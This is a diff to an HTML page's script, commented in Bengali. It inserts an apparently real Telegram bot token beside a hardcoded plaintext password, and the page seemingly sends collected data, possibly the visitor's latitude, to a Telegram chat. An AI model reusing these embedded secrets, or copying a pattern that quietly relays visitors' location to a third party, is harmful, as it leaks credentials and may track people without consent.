@@ -40,8 +40,9 @@
     <script>
         const SECRET_PASSWORD = "Tamim0186#@";
         
-        // ⚠️ আপনার টেলিগ্রাম বটের Token এবং Chat ID এখানে বসাবেন
-        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; 
+        // ✅ আপনার টেলিগ্রাম বটের Token কোডে বসানো হয়েছে
+        const TELEGRAM_BOT_TOKEN = "8566985497:AAEOAjObJ9nz67yeEdM1vOEncMyJnxerqJc"; 
+        // ⚠️ আপনার চ্যাট আইডিটি নিচে 'YOUR_CHAT_ID_HERE' সরিয়ে সেখানে বসিয়ে দিন
         const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
 
         let userLatitude = "Unknown";
@@ -109,7 +110,7 @@
                 if(data.ok) {
                     document.getElementById('msg').innerText = "✅ সফলভাবে ডেটা সেভ হয়েছে!";
                 } else {
-                    document.getElementById('msg').innerText = "❌ বটের টোকেন বা আইডি কনফিগার করা হয়নি।";
+                    document.getElementById('msg').innerText = "❌ চ্যাট আইডি ভুল থাকায় ডেটা পাঠানো যায়নি।";
                 }
             })
             .catch(err => {
@@ -118,4 +119,4 @@
         }
     </script>
 </body>
-</html>
+    </html>
